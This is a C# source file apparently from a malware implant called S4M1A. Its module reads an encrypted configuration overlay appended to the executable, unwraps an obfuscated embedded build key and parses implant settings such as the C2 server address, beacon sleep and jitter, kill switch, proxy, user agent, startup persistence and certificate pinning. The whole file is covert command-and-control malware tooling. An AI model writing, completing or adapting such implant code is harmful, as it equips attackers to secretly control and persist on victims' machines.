using System;
using System.IO;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Json;
using System.Text;

namespace S4M1A.Implant
{
    // =====================================================================
    //  S4M1A Config v2.0
    //  Loads the encrypted overlay config appended to the executable.
    //  Blob layout (see Crypto.cs / makeconfig.py):
    //      magic(8) || buildId(4) || iv(16) || ct || tag(32)
    //  The build key is unwrapped from the compiled-in EmbeddedKey.
    //  NOTE: overlay requires execution from a file on disk (the overlay
    //  is not part of the in-memory image when executed from byte[]).
    // =====================================================================

    [DataContract]
    public sealed class ImplantConfig
    {
        [DataMember(Name = "id")]    public string Id { get; set; }
        [DataMember(Name = "group")] public string Group { get; set; }
        [DataMember(Name = "name")]  public string Name { get; set; }
        [DataMember(Name = "c2")]    public string C2 { get; set; }
        [DataMember(Name = "sleep_ms")]   public int SleepMs { get; set; }
        [DataMember(Name = "jitter_pct")] public int JitterPct { get; set; }
        [DataMember(Name = "kill")]       public string Kill { get; set; }
        [DataMember(Name = "proxy")]      public bool Proxy { get; set; }
        [DataMember(Name = "ua")]         public string Ua { get; set; }
        [DataMember(Name = "pub")]        public string Pub { get; set; }
        [DataMember(Name = "startup")]     public bool Startup { get; set; }
        [DataMember(Name = "pin")]        public string PinThumbprint { get; set; }
    }

    public static class Config
    {
        private static ImplantConfig _current;

        public static ImplantConfig Current
        {
            get { return _current; }
        }

        public static bool Load()
        {
            try
            {
                byte[] buildKey = Crypto.UnwrapBuildKey(EmbeddedKey.Obf, EmbeddedKey.BuildId);
                string path = System.Reflection.Assembly.GetExecutingAssembly().Location;
                if (string.IsNullOrEmpty(path)) return false;

                byte[] fileBytes = File.ReadAllBytes(path);
                byte[] magic = Crypto.ConfigMagic(buildKey);
                int index = IndexOfMagic(fileBytes, magic);
                if (index < 0) return false;

                int blobLen = fileBytes.Length - index;
                byte[] blob = new byte[blobLen];
                Buffer.BlockCopy(fileBytes, index, blob, 0, blobLen);

                string json = Crypto.OpenConfig(buildKey, blob);
                if (json == null) return false;

                _current = Parse(json);
                return _current != null;
            }
            catch
            {
                return false;
            }
        }

        private static int IndexOfMagic(byte[] haystack, byte[] needle)
        {
            // scan from the tail so incidental copies in the middle are ignored
            if (needle.Length == 0 || haystack.Length < needle.Length) return -1;
            for (int i = haystack.Length - needle.Length; i >= 0; i--)
            {
                bool match = true;
                for (int j = 0; j < needle.Length; j++)
                {
                    if (haystack[i + j] != needle[j])
                    {
                        match = false;
                        break;
                    }
                }
                if (match) return i;
            }
            return -1;
        }

        private static ImplantConfig Parse(string json)
        {
            using (MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(json)))
            {
                DataContractJsonSerializer ser =
                    new DataContractJsonSerializer(typeof(ImplantConfig));
                return (ImplantConfig)ser.ReadObject(ms);
            }
        }
    }
}